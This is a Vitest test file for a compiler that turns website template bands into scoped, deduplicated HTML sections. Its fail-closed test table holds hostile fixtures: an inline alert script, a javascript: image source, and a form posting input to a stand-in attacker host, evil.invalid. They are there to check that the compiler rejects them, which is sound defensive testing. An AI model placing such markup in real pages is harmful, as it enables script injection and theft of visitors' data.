import { createHash } from "node:crypto";

import { describe, expect, it, vi } from "vitest";

import { compileDerivedSection, dedupeDerivedSections } from "./derived-section-compiler";
import type { ExtractedTemplateBand } from "./template-section-extractor";

const sha = (value: string) => `sha256:${createHash("sha256").update(value).digest("hex")}`;

function band(sourceHtml: string, ordinal = 1): ExtractedTemplateBand {
  const sourceIds = [...sourceHtml.matchAll(/\bid="([^"]+)"/g)].map((match) => match[1]);
  return {
    templateId: "arcana",
    templateContentHash: "a".repeat(12),
    ordinal,
    rootTag: "section",
    sourceHtml,
    sourceHash: sha(sourceHtml),
    sourceIds,
  };
}

const context = {
  templateHead: `<style>:root{--radius:18px}.hero{display:grid;grid-template-columns:1fr 1fr}.hero h1{font-size:64px}</style><link href="https://fonts.googleapis.com/css2?family=Nunito" rel="stylesheet">`,
  metadata: null,
};

const renderOk = vi.fn(async () => ({
  ok: true as const,
  desktopVisible: true,
  mobileVisible: true,
  mobileOverflow: false,
  score: 90,
}));

describe("compileDerivedSection", () => {
  it("scopes and compiles a deterministic provenance-bearing hero", async () => {
    const result = await compileDerivedSection(
      band(`<section id="hero" class="hero"><h1>Magic</h1><img src="/safe.webp" alt="Magic"></section>`),
      context,
      { validateRender: renderOk, validateAssets: async (): Promise<boolean> => true },
    );
    expect(result).toMatchObject({
      ok: true,
      section: {
        id: expect.stringMatching(/^derived-hero-arcana-1-[a-f0-9]{12}$/),
        type: "hero",
        contentHash: expect.stringMatching(/^[a-f0-9]{12}$/),
        provenance: {
          sourceTemplateId: "arcana",
          sourceTemplateHash: "a".repeat(12),
          sourceBandOrdinal: 1,
          sourceHash: expect.stringMatching(/^sha256:/),
          structuralFingerprint: expect.stringMatching(/^sha256:/),
        },
        semantics: { role: "hero" },
        renderScore: 90,
      },
    });
    if (result.ok) {
      expect(result.section.html).toContain(`data-sec="${result.section.id}"`);
      expect(result.section.html).toContain(`[data-sec="${result.section.id}"]`);
      expect(result.section.html).not.toContain(":root{");
      expect(result.section.html).not.toContain(".pricing");
    }
  });

  it("keeps only CSS dependencies used by the extracted band", async () => {
    const result = await compileDerivedSection(
      band(`<section id="hero" class="hero"><h1>Magic</h1></section>`),
      {
        ...context,
        templateHead: `<style>:root{--ink:#111}.hero{color:var(--ink)}.pricing{display:grid}</style>`,
      },
      { validateRender: renderOk, validateAssets: async () => true },
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.section.html).toContain(".hero");
      expect(result.section.html).not.toContain(".pricing");
    }
  });

  it.each([
    ["unsafe_script", `<section id="hero"><script>alert(1)</script></section>`, { validateRender: renderOk, validateAssets: async (): Promise<boolean> => true }],
    ["ambiguous_semantics", `<section id="unknown"><p>Something</p></section>`, { validateRender: renderOk, validateAssets: async (): Promise<boolean> => true }],
    ["asset_invalid", `<section id="hero"><img src="javascript:bad"></section>`, { validateRender: renderOk, validateAssets: async (): Promise<boolean> => false }],
    ["render_failed", `<section id="hero">Hero</section>`, { validateRender: async () => ({ ok: false as const, code: "render_failed" as const }), validateAssets: async (): Promise<boolean> => true }],
    ["mobile_overflow", `<section id="hero">Hero</section>`, { validateRender: async () => ({ ok: true as const, desktopVisible: true, mobileVisible: true, mobileOverflow: true, score: 20 }), validateAssets: async (): Promise<boolean> => true }],
    ["empty_geometry", `<section id="hero">Hero</section>`, { validateRender: async () => ({ ok: true as const, desktopVisible: false, mobileVisible: true, mobileOverflow: false, score: 20 }), validateAssets: async (): Promise<boolean> => true }],
    ["dependency_unavailable", `<section id="hero" class="hero">Hero</section>`, { validateRender: renderOk, validateAssets: async (): Promise<boolean> => true, context: { ...context, templateHead: `<style>.hero{color:var(--missing)}</style>` } }],
    ["contract_violation", `<section id="hero"><form action="https://evil.invalid/collect"><input></form></section>`, { validateRender: renderOk, validateAssets: async (): Promise<boolean> => true }],
  ] as const)("fails closed with %s", async (code, html, deps) => {
    const selectedContext = "context" in deps ? deps.context : context;
    const result = await compileDerivedSection(band(html), selectedContext, deps);
    expect(result).toEqual({ ok: false, code });
    expect(result).not.toHaveProperty("section");
  });
});

describe("dedupeDerivedSections", () => {
  it("keeps the stable strongest representative for exact and structural duplicates", async () => {
    const first = await compileDerivedSection(band(`<section id="hero">First</section>`, 1), context, { validateRender: async () => ({ ok: true, desktopVisible: true, mobileVisible: true, mobileOverflow: false, score: 80 }), validateAssets: async () => true });
    const same = await compileDerivedSection(band(`<section id="hero">First</section>`, 2), context, { validateRender: async () => ({ ok: true, desktopVisible: true, mobileVisible: true, mobileOverflow: false, score: 90 }), validateAssets: async () => true });
    const structural = await compileDerivedSection(band(`<section id="hero">Different copy</section>`, 3), context, { validateRender: async () => ({ ok: true, desktopVisible: true, mobileVisible: true, mobileOverflow: false, score: 70 }), validateAssets: async () => true });
    expect(first.ok && same.ok && structural.ok).toBe(true);
    if (!first.ok || !same.ok || !structural.ok) return;

    const result = dedupeDerivedSections([first.section, same.section, structural.section]);
    expect(result.accepted).toHaveLength(1);
    expect(result.accepted[0]?.renderScore).toBe(90);
    expect(result.duplicates.map((row) => row.reason).sort()).toEqual(["exact", "structural"]);
  });
});
